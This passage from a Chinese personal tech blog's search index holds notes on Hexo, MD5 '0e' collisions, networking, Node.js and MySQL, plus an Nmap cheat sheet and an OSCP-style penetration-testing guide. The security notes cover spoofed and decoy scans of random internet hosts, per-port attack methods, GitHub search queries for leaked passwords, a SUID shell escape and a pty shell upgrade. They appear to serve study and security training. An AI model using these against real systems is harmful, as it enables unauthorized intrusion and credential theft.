(F:\\blog\\node_modules\\bluebird\\js\\release\\async.js:17:14) at runCallback (timers.js:705:18) at tryOnImmediate (timers.js:676:5) 通过把文章移除_post文件夹，再运行hexo g的方式定位到了出问题的文章，又通过删除一段文字再hexo g的方式定位到了出问题的段落： 1变量的值可以用过滤器修改，形如``{{ variable|filter }}`` 多次尝试发现，除这种形式外，不用两个反引号引起的上段也会造成错误，原因不明。 解决方案：改用三个反引号","link":"/2019/11/29/hexobug/"},{"title":"MD5后以0e开头的字符串","text":"1234240610708==0e462097431906509019562988736854QNKCDZO==0e83040045199349405802421990339aabg7XSs==0e087386482136013740957780965295aabC9RqS==0e041022518165728065344349536299","link":"/2019/11/27/md5-0e/"},{"title":"mit-ai","text":"B站视频，MIT的入门课程 例子：将B1放到B2上 goal tree, and/or tree，目标树，建立了目标树的程序可以回答关于自身行为的问题。回答 why problem 时，向上一层；回答 how problem 时，向下一层就可以得到答案。 西蒙：行为的复杂性来源于环境的复杂性与程序的复杂性中的较大值。 例子：识别动物园的动物种类 基于规则的专家系统，rule based expert system，从已知的事实推出结论的，称为 forward-chaining system，forward chain本身形成了一个目标树，可以回答关于自身行为的问题。给出一个假设，通过规则向前考虑，称为backward-chaining system，forward 或者 backward 都称为 deduction system。 例子：杂货装袋 知识工程，knowledge engineering，三个规则。一、考虑个案，可以得到别人通过其他方式无法告诉你的知识。二、考虑看起来一样的，但实际处理起来不一样的东西。三、建立系统然后看它何时出错，可以知道系统缺少什么规则。 turn blue可以表示厌烦 搜索是关于选择的，以地图为例 search backtracking British Museum N Depth First Y Breadth First 搜素的具体实现（Depth First） 初始化一个队列 （如果第一个路径不是所需要的路径，则）扩展队列中的第一个路径，将新路径放在队首。（Breadth First的新路径放到队尾）","link":"/2020/01/22/mit-ai/"},{"title":"计算机网络","text":"《计算机网络：自顶向下方法》学习笔记、Wireshark 实验 计算机网络和因特网什么是因特网 描述因特网的具体构成，即构成因特网的基本硬件和软件组件 根据为分布式应用提供服务的联网基础设置描述因特网 具体构成描述因特网中存在大量主机，或称为端系统。它们通过通信链路和分组交换机连接到一起。当一台端系统要向另一台端系统发送数据时，发送端系统将数据分段，并为每段加上首部字节，由此形成的信息包称为分组。这些分组通过网络发送到目的端系统，在那里被装配成初始数据。 分组交换机从一条入通信链路接受到达的分组，并从一条出通信链路转发该分组，分组交换机中最常见的两种是路由器（router）和链路层交换机（link-layer switch）。链路层交换机通常用于接入网中，而陆幽清通常用于网络核心中。从发送端系统到接收端系统，一个分组所经历的一系列通信链路和分组交换机称为通过该网络的路径（route 或 path）。 端系统通过因特网服务提供商（Internet Service Provider，ISP）接入因特网。每个ISP是由一个或多个分组交换机和多段通信链路组成的网络，为端系统提供了不同类型的网络接入。每个 ISP 都是独立管理的，运行 IP 协议，遵从一定的命名和地址习惯。 端系统、分组交换机和其他因特网部件都要运行一系列协议（protocol），这些协议控制因特网中的信息的接受和发送。 服务描述从为应用程序提供服务的基础设施的角度描述因特网。分布式应用程序涉及多台相互交换数据的端系统，运行在端系统上而不是网络核心中的分组交换机中。 与因特网相连的端系统提供了一个应用程序编程接口（Application Programming Interface，API）该 API 规定了运行在一个端系统上的软件请求因特网基础设施向运行在另一个端系统上的特定目的地软件交付数据的方式。 什么是协议一个协议定义了在两个或多个通信实体之间交换的报文格式和次序，以及保温发送和/或接受一条报文或其他时间所采取的动作。 网络边缘通常把与因特网项链的计算机和其他设备称为端系统，因为它们位于因特网的边缘。端系统也称为主机，因为它们容纳（host）应用程序。主机有时又分为两类：客户（client）和服务器（server）。 接入网接入网（access network）是指将端系统连接到其边缘路由器（edge router）的物理链路。边缘路由器是端系统到任何其他远程端系统路径上的第一台路由器。接入链路有许多种： DSL、电缆、FTTH、拨号和卫星，用于家庭接入 以太网和 WiFi，用于企业和家挺接入 3G 和 LTE，广域无线接入 物理媒体使用以上接入技术时，也需要使用对应的物理媒体。 双绞铜线 同轴电缆 光纤 陆地无线电信道 卫星无线电信道 网络核心网络核心，即由互联网端系统的分组交换机和链路构成的网状网络。 通过网络链路和交换机移动数据有两种基本方法：电路交换（circuit swiching）和分组交换（packet switching）。 分组交换各种网络应用中，端系统彼此交换报文（message），报文能够包含协议设计者需要的任何东西。报文可以执行一种控制功能，也可以包含数据。为了从源端系统向目的端系统发送一个报文，源将长报文划分为较小的数据块，称之为分组（packet）。在源和目的之间，每个分组都通过铜线链路和分组交换机（packet switch）传送。 存储转发传输多数分组交换机在链路的输入端使用存储转发传输（store-and-forward transmission）机制。存储转发机制是指在交换机能够开始向输出端传输该分组的第一个比特之前，必须接收到整个分组。 排队时延和分组丢失每个分组交换机有多条链路与之相连。对于每条相连的链路，该分组交换机有一个输出缓存（output buffer），也称为输出队列（output queue），它用于存储路由器准备发往那条链路的分组。该输出缓存在分组交换中骑着重要作用。如果到达的分组需要传输到某条链路，但是该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待。因此，除了存储转发时延以外，分组还要承受输出缓存的排队时延（queue delay）。这些时延时是变化的，取决于网络中的拥塞程度。因为缓存大小是有限的，一个到达的分组可能发现该缓存已经被其他等待传输的分组填满，这时将出现分组丢失（丢包，packet lost），到达的分组或已经排队的分组之一将被丢弃。 转发表和路由选择协议因特网中，每个端系统具有一个称为 IP 地址的地址，当源主机要向目的端系统发送一个分组时，源在该分组的首部包含了目的地的 IP 地址，该地址具有一种等级结构。当一个分组到达网络中的路由器时，路由器检查该分组的目的地址的一部分，并向一台相邻路由器转发该分组。每台路由器具有一个转发表（forwarding table）用于将目的地址（或它的一部分）映射为输出链路。当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发现适当的输出链路，路由器则将分组导向该输出链路。 因特网具有一些特殊的路由选择协议（routing protocol）用于自动设置转发表。 电路交换在电路交换网络中，在端系统通信会话期间，预留了端系统间通信沿路径所需要的资源（缓存，链路传输速率）。在分组交换网络中，这些资源不是预留的，会话的报文按需使用这些资源，后果可能是不得不等待接入通信链路。 网络的网络提供网络接入的 ISP 本身也需要接入网络，使网络形成了复杂的结构。 分组交换网中的时延、丢包和吞吐量协议层次机器服务模型分层的体系结构协议分层各层的所有协议被称为协议栈（protocol stack），因特网的协议栈由5个层次组成：物理层，链路层，网络层，运输层，和应用层。 应用层是网络应用程序及它们的应用层协议存留的地方，包含许多协议，例如 HTTP，SMTP 和 FTP。位于应用层的信息分组称为报文（message） 运输层是在应用程序端点之间传送应用层报文。因特网中有两个运输层协议，TCP 和 UDP，利用其中任何一个都能运输应用层报文。位于运输层的信息分组称为报文段（segment） 网络层负责将称为数据报（datagram）的网络层分组从一台主机移动到另一台主机。包括 IP 协议和一些路由选择协议。 为了将分组从一个节点（主机或路由器）移动到路径的下一个节点，网络层必须依靠链路层服务。在每个节点，网络层将数据报下传给链路层，链路层沿着路径将数据报传递给下一个节点。在下一个节点，链路层将数据上传给网络层。包括以太网，WiFi 和电缆接入网的 DOCSIS 协议。链路层分组称为帧（frame） 物理层的任务是将帧中的一个一个比特从一个节点移动到下一个节点。该层协议也与链路相关，并且进一步与实际传输媒体相关。比如关于双绞铜线或者同轴电缆的协议。 OSI模型因特网协议栈并不是唯一的协议栈，国际标准化组织（OSI）提出计算机网络应组织为大约 7 层，应用层，表示层，会话层，运输层，网络层，数据链路层和物理层。 封装在每一层，一个分组具有两种类型的字段：首部字段和有效载荷字段（payload field），有效载荷通常来自于上一层的分组。 面对攻击的网络 将有害程序植入计算机 攻击服务器和网络基础设置 嗅探分组 伪装 计算机网络和因特网的历史应用层应用层协议原理网络应用程序体系结构","link":"/2020/08/04/network/"},{"title":"mysql 问题","text":"Docker 容器安装mysql 12docker pull mysql:5.7docker run -d mysql:5.7 -p 3306:3306 --name mysql5.7 -e MYSQL_PASSWORD root 宿主机中连接容器内的 mysql 需要使用 docker_machine 的IP 1docker inspect mysql5.7 | grep IP 连接问题：access denied","link":"/2021/03/28/mysql/"},{"title":"Node.js 相关","text":"不会 Node.js 的人已经不配再做 Web 狗了 NodeNode.js 是运行在服务端的 Javascript。使用 PHP 时，Apache 或者 Nginx 作为 HTTP 服务器，并使用 mode_php5 和 php-cgi 模块，接受 HTTP 请求并提供 Web 页面的过程不需要 PHP 处理。而使用 Node.js 时，我们不仅是在实现一个应用，同时也实现了整个 HTTP 服务器。 Node.js 应用由以下几部分组成： 引入 required 模块：通过 require载入模块 创建服务器：服务器可以监听客户端的请求，类似于 Apache 等 HTTP 服务器 接受请求与响应请求：客户端可以使用浏览器或终端发送 HTTP 请求，服务器接收请求后返回响应数据。 创建 Node.js 应用引入 required 模块1var http = require(&quot;http&quot;); 创建服务器使用 http.createServer 方法创建服务器，使用 listen 方法指定 8888 端口，函数通过 request, response 接受和响应数据。 123456789101112131415var http = require('http');http.createServer(function (request, response) { // 发送 HTTP 头部 // HTTP 状态值: 200 : OK // 内容类型: text/plain response.writeHead(200, {'Content-Type': 'text/plain'}); // 发送响应数据 &quot;Hello World&quot; response.end('Hello World\\n');}).listen(8888);// 终端打印如下信息console.log('Server running at http://127.0.0.1:8888/'); 使用 node 命令执行： 1node server.js NPMNPM 是随 Node 安装的包管理工具 123npm install &lt;package&gt; # 班底安装包npm install &lt;package&gt; -g # 全局安装包npm uninstall &lt;package&gt; # 卸载包 Node.js REPL（交互式解释器）使用 node 进入REPL 回调函数Node.js 具有异步特性，通过回调函数来实现 事件循环","link":"/2020/08/21/node-js/"},{"title":"Nmap","text":"Nmap 使用方法、小技巧 Nmap中文手册，保存为 HTML 格式打开 基本扫描12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273nmap -T4 -sn [ip] # 主机发现nmap -T4 [ip] # 端口扫描nmap -T4 -sV [ip] # 服务扫描nmap -T4 -O [ip] # 操作系统扫描# 扫描选项-sP # 只扫描在线情况-sS # SYN 扫描-sT # TCP 扫描-sU # UDP 扫描-sV # 服务版本检测-O # 操作系统识别-p # 指定扫描的端口，使用 -p- 扫描全端口-F # 快速扫描最可能开放的 100 个端口-n/-R # 不使用/总是使用 DNS 解析--scanflags # 指定 TCP 标志位，包括 URG, ACK, PSH, RST, SYN, FIN# 时序选项-T0 偏执的：非常非常慢，用于IDS逃逸-T1 猥琐的：相当慢，用于IDS逃逸-T2 有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍-T3 普通的：默认，根据目标的反应自动调整时间模式-T4 野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标-T5 疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口# 脚本-sC 等价于–script=default，使用默认类别的脚本进行扫描 可更换其他类别 –script=&lt;Lua scripts&gt; &lt;Lua scripts&gt;使用某个或某类脚本进行扫描，支持通配符描述–script-args=&lt;n1=v1,[n2=v2,...]&gt; 为脚本提供默认参数–script-args-file=filename 使用文件来为脚本提供参数–script-trace 显示脚本执行过程中发送与接收的数据–script-updatedb 更新脚本数据库–script-help=&lt;scripts&gt; 显示脚本的帮助信息，其中&lt;scripts&gt;部分可以逗号分隔的文件或脚本类别# 脚本分类auth 负责处理鉴权证书（绕开鉴权）绕过目标主机得访问控制的脚本broadcast 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务brute 提供暴力破解方式，针对常见的应用如http/snmp等default 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力discovery 对网络进行更多的信息，如SMB枚举、SNMP查询等dos 用于进行拒绝服务攻击exploit 利用已知的漏洞入侵系统external 利用第三方的数据库或资源，例如进行whois解析fuzzer 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽malware 探测目标机是否感染了病毒、开启了后门等信息safe 此类与intrusive相反，属于安全性脚本version 负责增强服务与版本扫描（Version Detection）功能的脚本vuln 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067按脚本分类扫描# 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令nmap --script=auth 192.168.137.*# 提供暴力破解的方式 可对数据库，smb，snmp等进行简单密码的暴力猜解nmap --script=brute 192.168.137.*# 默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.*# 检查是否存在常见漏洞nmap --script=vuln 192.168.137.* # 在局域网内探查更多服务开启状况nmap -n -p445 --script=broadcast 192.168.137.4# 利用第三方的数据库或资源，例如进行whois解析nmap --script external 202.103.243.110 高级扫描12345678-iflist # 查看本地路由和接口，当遇到无法达到目标主机或想选择从多块网卡中某一特定网卡访问目标主机时，可以查看nmap –iflist中提供的网络接口信息。-e [interface] # 指定使用特定网口发送数据，可参考 -iflist 信息-S [spoofip] # 使用特定源 IP 发送数据-D [ip1/ME],[ip2/ME]... # 使用诱骗方式隐藏真实扫描地址，使用多个IP同时扫描，ME代表自己的真实地址-g/-sourve-port # 指定源端口-spoof-mac # 指定欺骗的 MAC 地址-scanflag # 定制 TCP 胡举报标志位，包括 URG, ACK, PSH, RST, SYN, FIN-ip-options # 定制 IP 包的 OPTIONS 字段 Nmap 端口状态 状态 说明 open 应用程序在该端口接收 TCP 连接或者 UDP 报文 closed 关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听 filtered 由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙 unfiltered 未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态 open | filtered 无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议， FIN, Null 等扫描会引起。 扫描防火墙 命令 类型 说明 nmap -sS [ip] SYN 扫描 - nmap -sF [ip] FIN 扫描 识别端口是否关闭，收到RST说明端口关闭，否则为 open 或者 filtered nmap -sA [ip] ACK 扫描 识别端口是否被过滤，收到RST说明端口未被过滤（open 或者 closed） nmap -sW [ip] Window 扫描 只用于某些 TCP/IP 协议实现，发送ACK，检查回复的RST包中的 Window size，关闭的端口为0，开放的端口非0 用以上方式交叉扫描可以得出端口的真实状态。 扫描路由器123456nmap -p1-25,80,512-515,2001,4001,6001,9001 [subnet] # 思科路由器在上述端口中运行了一些常见服务，列出这些端口开放的主机可以帮助定位路由器的IP地址可端口状态nmap –sU –p69 –nvv [ip]# 多数路由器支持 TFTP（简单文件传输协议）用于备份和回复路由器配置文件，运行在 UDP 69 端口nmap -F -O -n [ip]# 扫描操作系统 扫描互联网1nmap -iR 100000 -sS -PS80 -p 80 -oG nmap.txt 随机生成 10w 个 IP 地址，对它们的80端口进行扫描，将结果以 grepable 格式输出到 nmap.txt 1nmap -iR 1200000 -sL -n | grep ”not scanned” | awk ’{print $2}’ | sort -n | uniq &gt;! tp; head -25000000 tp &gt;! tcp-allports-1M-IPs; rm tp 随机生成1200000个IP地址（-iR 120000），并进行列表扫描（-sL，列举出IP地址，不进行真正的扫描），不进行dns解析操作（-n），这样将产生Nmap列表扫描的结果。在此 结果中搜出未扫描的行（grep “not scanned”），打印出每一行的第二列内容（awk ‘{print $2}’，也就是IP地址），然后对获取到的IP地址进行排序（sort -n），然后剔除重复IP地址，将结果保存到临时文件tp，再取出前1000000个IP地址保存到tcp-allports-1M-IPs文件中，删除 临时文件。 1nmap -sP -PE -PP -PS21,22,23,25,80,113,31339-PA80,113,443,10042 –source-port 53 -T4 -iL tcp-allports-1M-IPs 使用产生的IP地址（-iL tcp-allports-1M-IPs），指定发送包的源端口为53（–source-port 53，该端口是DNS查询端口，一般的防火墙都允许来自此端口的数据包），时序级别为4（-T4，探测速度比较快），以TCP SYN包方式探测目标机的21,22,23,25,80,113,31339端口，以TCP ACK包方式探测对方80,113,443,10042端口，另外也发送ICMP ECHO/ICMP TIMESTAMP包探测对方主机。只要上述的探测包中得到一个回复，就可以证明目标主机在线。 1nmap -S [srcip] -d –max-scan-delay 10 -oAlogs/tcp-allports-%T-%D -iL tcp-allports-1M-IPs –max-retries 1–randomize-hosts -p- -PS21,22,23,25,53,80,443 -T4 –min-hostgroup 256 –min-rate175 –max-rate 300 使用包含100万个IP地址的文件（-iL tcp-allports-1M-IPs），源端IP地址设置为srcip(指定一个IP地址，保证该IP地址位于统一局域网中，否则无法收到目标机的回 复包)，主机发现过程使用TCP SYN包探测目标机的21,22,23,25,53,80,443，扫描过程将随机打乱主机顺序（–randomize-hosts，因为文件中的IP 已经排序，这里将之打乱，避免被防火墙检查出），端口扫描过程检查全部的TCP端口（-p-，端口1到65535），使用时序级别为4（-T4，速度比较 快），将结果以XML/grepable/普通格式输出到文件中（-oA logs/tcp-allports-%T-%D，其中%T表示扫描时间，%D表示扫描日期）。 -d表示打印调试出信息。 –max-scan-delay 10表示发包最多延时10秒，防止特殊情景下等待过长的时间。 –max-retries 1，表示端口扫描探测包最多被重传一次，防止Nmap在没有收到回复的情况下多次重传探测包，当然这样也会降低探测的准确性。 –min-host-group 256表示进行端口扫描与版本侦测时，同时进行探测的主机的数量，这里至少256个主机一组来进行扫描，可以加快扫描速度。 –min-rate 175和–max-rate 300，表示发包速率介于175和300之间，保证扫描速度不会太慢，也不会因为速率过高引起目标机的警觉。 由以上扫描得出互联网上最可能开放的 10 个 TCP 端口： 1234567891080 (http)23 (telnet)22 (ssh)443 (https)3389 (ms-term-serv)445 (microsoft-ds)139 (netbios-ssn)21 (ftp)135 (msrpc)25 (smtp) 最可能开放的 UDP 端口： 12345678910137 (netbios-ns)161 (snmp)1434 (ms-sql-m)123 (ntp)138 (netbios-dgm)445 (microsoft-ds)135 (msrpc)67 (dhcps)139 (netbios-ssn)53 (domain) 扫描 Web 站点1nmap -sV -p 80 -T4 –script=http*,default scanme.nmap.org","link":"/2020/06/12/nmap/"},{"title":"渗透框架","text":"OSCP Guide 信息收集whois 信息获取注册人信息，包括注册邮箱、注册公司、管理员邮箱、管理员联系电话，可以社工，还可以查询同一注册人注册的其他域名，域名对应的NS记录、MX记录，自动识别国内常见托管商 123456http://ipwhois.cnnic.net.cn/http://whois.chinaz.comhttps://x.threatbook.cn/https://who.is/https://whois.aizhan.com/Linux whois 命令 站长之家和微步支持反查，另外两个中文显示有乱码 子域名 爆破， 12345wydomain,sublist3rlayer 子域名挖掘机（支持端口扫描和探测服务器类型）https://phpinfo.me/domainsubDomainsBrute google hack，搜索 site:example.com，也可以使用其他搜索引擎 dns解析记录、爬虫、ssl证书、dns历史解析等等 备案信息分为 IPC 备案信息和公安部备案信息，只有国内服务器需要备案。 12http://www.beianbeian.com/http://www.gsxt.gov.cn/index.html 企业信息天眼查、启信宝 CDN判断 Nslookup，Windows 命令： 1nslookup baidu.com host,dig , Linux 命令： 12host 360.cndig 360.cn 多地ping，网站： 123https://asm.ca.com/en/ping.php/http://ping.chinaz.com/https://ping.aizhan.com/ 使用工具查询 1234http://www.cdnplanet.com/tools/cdnfinder/https://www.ipip.net/ip.htmlhttp://tool.chinaz.com/dns/https://tool.lu/dns/ 绕过 子域名入手，有些子域名没有使用 cdn 利用网站漏洞，比如 phpinfo 信息泄露， Apache status 和 Jboss statu 泄露，源代码泄露， svn信息泄露， github 信息泄露 历史dns记录，查询网站： 12345678https://dnsdb.io/zh-cn/https://x.threatbook.cn/http://toolbar.netcraft.com/site_report?url=http://viewdns.info/http://www.17ce.com/https://sitereport.netcraft.com/https://community.riskiq.com/http://www.crimeflare.com/cfssl.html CDN 本身入手，比如利用社工获得控制面板的账号密码 Mx记录或邮件，很多站点有发送邮件的功能，比如 rss 订阅，邮件系统一般在内部，没有经过CDN，邮件源码中可能包含服务器真实 IP 国外请求，国内CDN有时不会覆盖国外，可以通过国外代理访问得到真实 IP 1https://asm.ca.com/en/ping.php 扫描探测，通过信息收集，缩小扫描范围，确定一个较小的 IP 和端口范围，通过 http 指纹特征和 keyword 等综合判断 12https://github.com/zmap/zgrab/http://www.ipdeny.com/ipblocks/ Zmap，参考 安全客 - 简单获取 CDN 背后的真实IP 网络空间引擎搜索，zoomeye fofa shodan，获得历史快照，获取特征，例如：特有的 HTTP 头（server类型，版本，cookie等信息）、特定keyword（title, css, js, url等）、特定IP段搜索（fofa支持C段搜索） 查询 HTTPS 证书， 1https://censys.io/ 这个网站会将所有 IP 进行扫描和连接，以及证书探测，如果目标站点有 https 证书，而且默认虚拟主机配了https证书，就可以找所有目标站点是改https证书的站点。 1443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:www.xxx.com F5 LTM 负载均衡解码获取真实内网IP，透过F5获取服务器真实内网IP - ThreatHunter 旁站查询与目标网站在同一台服务器上的网站 1https://tool.lu/dns/ C段查询与目标服务器IP在同一C段的服务器 12北极熊扫描器Nmap /24 邮箱收集首先确定目标邮件服务器所在的真实位置，看看邮件服务器有没有什么错误配置，比如没有禁用VREY或者EXPN命令导致用户信息泄露。然后从 whois 中获得域名的注册人，管理员邮箱，利用该搜索引擎和社工库等查看有没有泄露密码。或者从目标站点上搜集邮箱，比如网站上的联系我们，可以用于钓鱼。工具：theharvester 端口扫描开始时可以使用 telnet 简单检查端口是否开放，防止使用扫描器被封IP。可以用 nmap, masscan进行扫描，常见端口以及渗透方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051端口号 端口服务/协议简要说明 关于端口可能的一些渗透用途tcp 20,21 ftp 默认的数据和命令传输端口[可明文亦可加密传输] 允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)tcp 22 ssh[数据ssl加密传输] 可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…tcp 23 telnet[明文传输] 爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获tcp 25 smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务] 邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑tcp/udp 53 dns[域名解析] 允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控tcp/udp 69 tftp[简单文件传输协议,无认证] 尝试下载目标及其的各类重要配置文件tcp 80-89,443,8440-8450,8080-8089 web[各种常用的web服务端口] 各种常用web服务端口,可尝试经典的top n,vpn,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……tcp 110 [邮局协议,可明文可密文] 可尝试爆破,嗅探tcp 137,139,445 samba[smb实现windows和linux间文件共享,明文] 可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……tcp 143 imap[可明文可密文] 可尝试爆破udp 161 snmp[明文] 爆破默认团队字符串,搜集目标内网信息tcp 389 ldap[轻量级目录访问协议] ldap注入,允许匿名访问,弱口令tcp 512,513,514 linux rexec 可爆破,rlogin登陆tcp 873 rsync备份服务 匿名访问,文件上传tcp 1194 openvpn 想办法钓vpn账号,进内网tcp 1352 Lotus domino邮件服务 弱口令,信息泄漏,爆破tcp 1433 mssql数据库 注入,提权,sa弱口令,爆破tcp 1521 oracle数据库 tns爆破,注入,弹shell…tcp 1500 ispmanager 主机控制面板 弱口令tcp 1025,111,2049 nfs 权限配置不当tcp 1723 pptp 爆破,想办法钓vpn账号,进内网tcp 2082,2083 cpanel主机管理面板登录 弱口令tcp 2181 zookeeper 未授权访问tcp 2601,2604 zebra路由 默认密码zerbratcp 3128 squid代理服务 弱口令tcp 3312,3311 kangle主机管理登录 弱口令tcp 3306 mysql数据库 注入,提权,爆破tcp 3389 windows rdp远程桌面 shift后门[需要03以下的系统],爆破,ms12-020[蓝屏exp]tcp 4848 glassfish控制台 弱口令tcp 4899 radmin远程桌面管理工具,现在已经非常非常少了 抓密码拓展机器tcp 5000 sybase/DB2数据库 爆破,注入tcp 5432 postgresql数据库 爆破,注入,弱口令tcp 5632 pcanywhere远程桌面管理工具 抓密码,代码执行,已经快退出历史舞台了tcp 5900,5901,5902 vnc远程桌面管理工具 弱口令爆破,如果信息搜集不到位,成功几率很小tcp 5984 CouchDB 未授权导致的任意指令执行tcp 6379 redis未授权 可尝试未授权访问,弱口令爆破tcp 7001,7002 weblogic控制台 java反序列化,弱口令tcp 7778 kloxo 主机面板登录tcp 8000 Ajenti主机控制面板 弱口令tcp 8443 plesk主机控制面板 弱口令tcp 8069 zabbix 远程执行,sql注入tcp 8080-8089 Jenkins,jboss 反序列化,控制台弱口令tcp 9080-9081,9090 websphere控制台 java反序列化/弱口令tcp 9200,9300 elasticsearch 远程执行tcp 10000 webmin linux主机web控制面板入口 弱口令tcp 11211 memcached 未授权访问tcp 27017,27018 mongodb 爆破,未授权访问tcp 3690 svn服务 svn泄露,未授权访问tcp 50000 SAP Management Console 远程执行tcp 50070,50030 hadoop 默认端口未授权访问 nmap 常用选项： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# 扫描选项-sP # 只扫描在线情况-sS # SYN 扫描-sT # TCP 扫描-sU # UDP 扫描-sV # 服务版本检测-O # 操作系统识别--scanflags # 指定 TCP 标志位，包括 URG, ACK, PSH, RST, SYN, FIN# 时序选项-T0 偏执的：非常非常慢，用于IDS逃逸-T1 猥琐的：相当慢，用于IDS逃逸-T2 有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍-T3 普通的：默认，根据目标的反应自动调整时间模式-T4 野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标-T5 疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口# 脚本-sC 等价于–script=default，使用默认类别的脚本进行扫描 可更换其他类别 –script=&lt;Lua scripts&gt; &lt;Lua scripts&gt;使用某个或某类脚本进行扫描，支持通配符描述–script-args=&lt;n1=v1,[n2=v2,...]&gt; 为脚本提供默认参数–script-args-file=filename 使用文件来为脚本提供参数–script-trace 显示脚本执行过程中发送与接收的数据–script-updatedb 更新脚本数据库–script-help=&lt;scripts&gt; 显示脚本的帮助信息，其中&lt;scripts&gt;部分可以逗号分隔的文件或脚本类别# 脚本分类auth 负责处理鉴权证书（绕开鉴权）绕过目标主机得访问控制的脚本broadcast 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务brute 提供暴力破解方式，针对常见的应用如http/snmp等default 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力discovery 对网络进行更多的信息，如SMB枚举、SNMP查询等dos 用于进行拒绝服务攻击exploit 利用已知的漏洞入侵系统external 利用第三方的数据库或资源，例如进行whois解析fuzzer 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽malware 探测目标机是否感染了病毒、开启了后门等信息safe 此类与intrusive相反，属于安全性脚本version 负责增强服务与版本扫描（Version Detection）功能的脚本vuln 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067按脚本分类扫描# 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令nmap --script=auth 192.168.137.*# 提供暴力破解的方式 可对数据库，smb，snmp等进行简单密码的暴力猜解nmap --script=brute 192.168.137.*# 默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.*# 检查是否存在常见漏洞nmap --script=vuln 192.168.137.* # 在局域网内探查更多服务开启状况nmap -n -p445 --script=broadcast 192.168.137.4# 利用第三方的数据库或资源，例如进行whois解析nmap --script external 202.103.243.110 服务器和中间件信息通过 nmap, zmap 等端口和指纹识别功能搜集，也可以使用 nc 和 telnet 进行 banner信息识别，常用工具 whatweb, www.yunsee.cn , wappalyzer WAFWAF识别一般基于 header 信息，工具：waf00f，whatwaf，nmap nmap 脚本：http-waf-detect, http-waf-fingerprint 敏感文件、目录扫描 御剑，dirsearch，dirb，dirbuster 搜索引擎，基本语法 123456789101112&quot;&quot; # 强制搜索- # 不包含该管检测| # 或者site # 与这个域名相关intext # 正文中包含关键词intitle # 标题中包含关键词cache # 搜索缓存define # 搜索定义filetype # 搜索指定文件类型info # 查找站点基本信息inurl # 包含关键词的URLlink # 包含链接 BBscan GSIL，搜索Github信息 社交平台（QQ群，文库，求职网），可以通过QQ群文件，在线文档平台等泄露敏感信息 CMS12345678国内：http://whatweb.bugscaner.com/look/http://yunsee.cnhttp://finger.tidesec.net/国外：https://whatcms.orghttps://itrack.ru/whatcms/http://cmsdetect.com/ 识别后可以搜索已知漏洞，查找源代码进行审计。 脆弱系统通过网络空间搜索引擎进行查询 123shodanfofazoomeye Github搜索 github 上的信息 邮件配置： 1234567site:Github.com smtpsite:Github.com smtp @qq.comsite:Github.com smtp @126.comsite:Github.com smtp @163.comsite:Github.com smtp @sina.com.cnsite:Github.com smtp passwordsite:Github.com String password smtp 数据库信息： 123site:Github.com sa passwordsite:Github.com root passwordsite:Github.com User ID=’sa’;Password SVN 信息： 1234site:Github.com svnsite:Github.com svn usernamesite:Github.com svn passwordsite:Github.com svn username password 数据库备份： 1site:Github.com inurl:sql 其他： 1234site:Github.com passwordsite:Github.com ftp ftppasswordsite:Github.com 密码site:Github.com 内部 权限提升Linux 提权参考 SUID 提权SUID提权 查找所有SUID可执行文件 123find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} \\; 可 SUID 提权的可执行文件： Nmap（2.02-5.21） find 1find . -exec /bin/sh -p \\; -quit vim bash less more Sudo提权 注意事项升级shell参考Upgrading Simple Shells to Fully Interactive TTYs 升级方法有三： 使用 python pty 模块 1python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' 使用 socat 攻击者（监听） 